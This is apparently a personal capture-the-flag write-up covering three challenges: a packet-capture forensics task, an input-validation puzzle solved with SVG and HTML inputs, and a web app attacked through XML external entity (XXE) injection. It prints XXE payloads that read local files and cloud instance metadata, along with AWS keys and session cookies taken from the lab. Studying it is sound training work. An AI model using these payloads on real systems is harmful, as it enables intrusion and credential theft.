
Before going in - going left here will take you to a rope you can go up and get a chest

# boriaArtifacts

Given victim.pcap  weberror.log

weberror.log
3.144.44.185 - - [05/Oct/2022 16:48:32] this line is the XXE command getting /etc/passwd -- wireshark packet 31025

18.191.6.79 - - [05/Oct/2022 16:48:57] - get access key -- wireshark packet 32925

Pcap

36874 Total packets

7279 brute forcing starts from 18.222.86.32 post /login

27716 doesnt have login form or 'Invalid username or password'

29666 -
404 not found
```
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
User-Agent: aws-sdk-go/1.41.4 (go1.17.6; linux; amd64)
X-Aws-Ec2-Metadata-Token: AQAAAPwiIBR0xFd4CrlYxGf5qvX621qMJ0SdjqgB25Xij_GqJf8P2A==
Accept-Encoding: gzip
```

31025 looks like they got /etc/passwd to work

31390 maybe wierd cookie?

31793 src: 18.222.86.32 Dest: 10.12.42.16 /Post proc

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/"> ]>

<product><productId>&id;</productId></product>
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 05 Oct 2022 16:48:42 GMT
```
This looks like an XXE attack


32191 src: 18.222.86.32 Dest: 10.12.42.16 /Post proc

32925 has 
```
GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.0

Host: 169.254.169.254

Accept-Encoding: gzip

HTTP/1.0 200 OK

Accept-Ranges: bytes

Content-Length: 1514

Content-Type: text/plain

Date: Wed, 05 Oct 2022 16:48:57 GMT

Last-Modified: Wed, 05 Oct 2022 16:42:35 GMT

Connection: close

Server: EC2ws
{

"Code" : "Success",

"LastUpdated" : "2022-10-05T16:43:21Z",

"Type" : "AWS-HMAC",

"AccessKeyId" : "ASIAV4AVRXQVJ267LD2Q",

"SecretAccessKey" : "OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT",

"Token" : "IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkCyl5WOMN7owHr84k+hz4XZYBUp7/+KFZgEiKARroMuD6ofdNRvAj7dQ1/wFxeR6wezUPUkHqtc303oTBY7eTk5EQXClpKsmV1l25QAfD0DOL6FPxpjLPug0AbDFlIhjUeImvk3NBWiUHtXptrJH2ksSaQqU2DBPkkQ4IjMBMbLj0ZdJVWaiUy9sf5ecc2d/qVQU1c6SrYLg0HpyuH9brqm0zuv8/tR17Y/Jo2aNeNGX1wvyb5jP1FcQteypV6IqKIUUCADJ7chYeMypMlwV77phvrZco921O6MV+JlhSIomuzFRLdvzD+RP8DyLZeYZ65vKzr6h0yc+XIHOCT+P01pWQgfZBtvfCJKLKqwTMEbIr/i/xgGmHoCTzx6m38kd4EZvGXZMp3EEasdnqTtKLOR6JFAAlW8SoxOKRL1MshK3SUmYvWnMoLKCotPwyJeAMHEHuZipNMiZ2gbN//PMbUBnPjNVFBP4SfHaTv7EHzHNpTl5toy8qlPyxE0yLbh5a//DF5wJQE6UKfXWlQhk9/NVM7QAAzEzWPiFTp8ajRIDjPoprVlX3yUaTUHOH8PwMtURCJLl0sOQaJtRGWEMrH52ls5e83pm0ta8257vu8HyTR7zgc/7a0ZsoxetlsB7VYIKyXnETO7SMniTO8R/yE1Wn9qAoWp/jMPvn9pkGOo8CLegclGA49hB/LRr/V1bXEyIIRg5Zn93xXvccMX5QyKGVSRghNOVGn/cCglDWc9zSRFRlZ4tHblVi1v8021J04REPR69FDuVvpUzEDJfDF1u4XwYGsp7uuuIngiiegP56H5nSYjmpBfyIURwgNvsz6ptpUvplGCxOvBJcKeyborHJDKG40QRXsLpOgB8NTKhgaFNxO7PjA/YrT7g1rYS7xNrKzVIK4tTwxWB5zN5JAQ3pVRp2JB8Q1ng3qsj3UPfZ3O3JjY4U+rrBKPEHIw9B+Pz6kffOu73aPKgo333w/hd9U4slj74JQXPhO9jCYpAF1bLdS/If20Ed6HvGcAONep0A/FrtZ62EWX4HmeYZ4A==",

"Expiration" : "2022-10-05T23:00:40Z"

}
```

Becasue there are alot of packets filtering is important. Because they were bruteforcing alot of the Lengths were the same. Most of these interesting packets were the ones with unique lengths.  

all102s are brute force fails. From length 118-217 has intersting uniques
![Pasted image 20221207190252](https://user-images.githubusercontent.com/50979196/209564540-a89d5bb3-6532-474b-80ec-d2ea0d2cf622.png)


![Pasted image 20221207195321](https://user-images.githubusercontent.com/50979196/209564628-c6991550-7ed3-46b6-bf90-c27fbd7e14b8.png)


answer 18.22.86.32

![Pasted image 20221207195727](https://user-images.githubusercontent.com/50979196/209564643-b07830d7-963b-40e6-9a67-4c226679ff3a.png)

packet 7279 - alice

![Pasted image 20221207195754](https://user-images.githubusercontent.com/50979196/209564664-42151046-9fd6-4f56-a6f2-d8c274a29a8f.png)

![Pasted image 20221207200049](https://user-images.githubusercontent.com/50979196/209564683-d2f77e7f-c573-49cc-9d78-dac12cb06844.png)

answer = /proc

![Pasted image 20221207200400](https://user-images.githubusercontent.com/50979196/209564699-bf297f17-7e4f-4bd5-9d82-df14d4ca7da3.png)

```
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```
![Pasted image 20221207200441](https://user-images.githubusercontent.com/50979196/209564710-af6139f7-8744-42c9-bcfb-98a0cad37b54.png)



# Boria Mine Door
Hint from alabaster
https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

#1 #2
```
<style>   hr {     border: 100px solid white;   } </style> <hr>
```
#3
```

<?xml version="1.0" standalone="no"?>
<svg width="500" height="500" version="1.1" xmlns="http://www.w3.org/2000/svg">

  <rect x="0" y="0" rx="50" ry="50" width="300" height="300" stroke="blue" fill="blue" stroke-width="50"/>

</svg>
```



(4,5,6 are reverse, bottom left is 6)
#6
```
<?xml version="1.0" standalone="no"?>
<svg width="500" height="500" version="1.1" xmlns="http://www.w3.org/2000/svg">

 <rect x="0" y="0" width="300" height="40" 
  stroke="#00FF00" fill="#00FF00" stroke-width="20"/>
  <rect x="0" y="130"  width="300" height="30" stroke="blue" fill="blue" stroke-width="50"/>

<line x1="0" x2="300" y1="90" y2="100" stroke="red" stroke-width="40"/>


</svg>
```
#5
the below code will shw a broken page, using &quote, i cant get <> equives to execute yet

on chrome right click text box of pin 5, blur text remove
```
<?xml>
<svg width="500" height="500">

 <rect x="0" y="0" width="500" height="40" 
  stroke="red" fill="red" stroke-width="50"/>
 <rect x="0" y="0" width="50" height="400" 
  stroke="red" fill="red" stroke-width="50"/>
  <rect x="40" y="100"  width="200" height="110" stroke="blue" fill="blue" stroke-width="30"/>


</svg>


```
#5 has a sanitize script
![Pasted image 20221212213801](https://user-images.githubusercontent.com/50979196/209565174-25279c94-faef-4d56-8023-ea3084f54a62.png)

```

        const sanitizeInput = () => {
            const input = document.querySelector('.inputTxt');
            const content = input.value;
            input.value = content
                .replace(/"/gi, '')
                .replace(/'/gi, '')
                .replace(/</gi, '')
                .replace(/>/gi, '');
        }
    
```
#4
```
<?xml>
<svg width="500" height="500">

 <rect x="0" y="0" width="400" height="40" 
  stroke="white" fill="white" stroke-width="400"/>
  <rect x="0" y="100"  width="300" height="30" stroke="blue" fill="blue" stroke-width="50"/>


</svg>

```


https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Basic_Shapes

# Glamtariel's Fountain

## Significant CASE
Hint#1
From: Hal Tandybuck
Objective: Glamtariel's Fountain
Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.

Hint#2
eXternal Entities
From: Hal Tandybuck
Objective: Glamtariel's Fountain
Sometimes we can hit web pages with XXE when they aren't expecting it!
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

Early parts of challenge can be solved using uppercase words. v
Traffic flies, tamper, paths, app, types, ringlist, simple format,




![Pasted image 20221211113924](https://user-images.githubusercontent.com/50979196/209565228-6d15fa66-7de7-4143-957e-d65e9bb603c9.png)

![Pasted image 20221211120426](https://user-images.githubusercontent.com/50979196/209565236-7e9133fb-f39c-47a2-b863-822dcbb1dfc1.png)


Got these buy dragging objects onto princess in any order 1-4 then fountain 1-4

![Pasted image 20221211120820](https://user-images.githubusercontent.com/50979196/209565276-e10f995c-5702-4297-a090-9fddf4e5a93c.png)


![Pasted image 20221211120936](https://user-images.githubusercontent.com/50979196/209565279-88aeda54-2a00-4ab4-a46b-37d4c9c88b9a.png)

![Pasted image 20221211121008](https://user-images.githubusercontent.com/50979196/209565286-5ca699de-c046-4e99-a048-de6f4a55727e.png)

![Pasted image 20221211121105](https://user-images.githubusercontent.com/50979196/209565294-7740a1c5-1398-4fc7-a6bd-cb865d214cd4.png)

first step was finding the path
/app/static/images/ringlist

xml code that executes
```
<?xml version="1.0" encoding="UTF-8"?>

<root>
  <imgDrop>img2</imgDrop>
  <who>fountain</who>
  <reqType>xml</reqType>
</root>
```

![Pasted image 20221215101312](https://user-images.githubusercontent.com/50979196/209565429-355efeda-4115-49de-aa8f-80cad7e3db61.png)

![Pasted image 20221218103915](https://user-images.githubusercontent.com/50979196/209565435-38573f72-dab9-4918-8485-84b9b3159a57.png)

x_phial_pholder_2022

```https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png```

secret hidden inside picture of red ring
```
https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>

```
![Pasted image 20221218112951](https://user-images.githubusercontent.com/50979196/209565632-74e77f19-8db4-43bc-b613-a37b2d1e611e.png)

change the xxe to the reqtype
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">
]>
<root>
  <imgDrop>img1</imgDrop>
  <who>princess</who>
  <reqType>&xxe;</reqType>
</root>

```
![Pasted image 20221219071235](https://user-images.githubusercontent.com/50979196/209565667-49b08cb0-7239-46c5-bbf3-d01438566094.png)

static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png
![Pasted image 20221219071433](https://user-images.githubusercontent.com/50979196/209565677-33054ff6-da54-41d9-a521-34e2504645cb.png)

![Pasted image 20221219071736](https://user-images.githubusercontent.com/50979196/209565686-a3a7cec9-675b-414f-9d60-2a42e6e20f9f.png)



given cookies never used
```
miniLembanh:b8f248b3-dff7-4cf6-8274-60a14cfbbdae.M72vYZdNQ89WXy029xQcNHhDj68
GCLG: "537db2fc2d14c1af"

Snack: b8f248b3-dff7-4cf6-8274-60a14cfbbdae
Ticket: ImZjNmU0MGUzZDhiNGM5YjkzNWM3MWYzNGUxM2Q5ZWYyMTYxMmZhODIi.Y5n3qg.hzPO7DtgavWrqA3mzamj9kTj3Eo
```
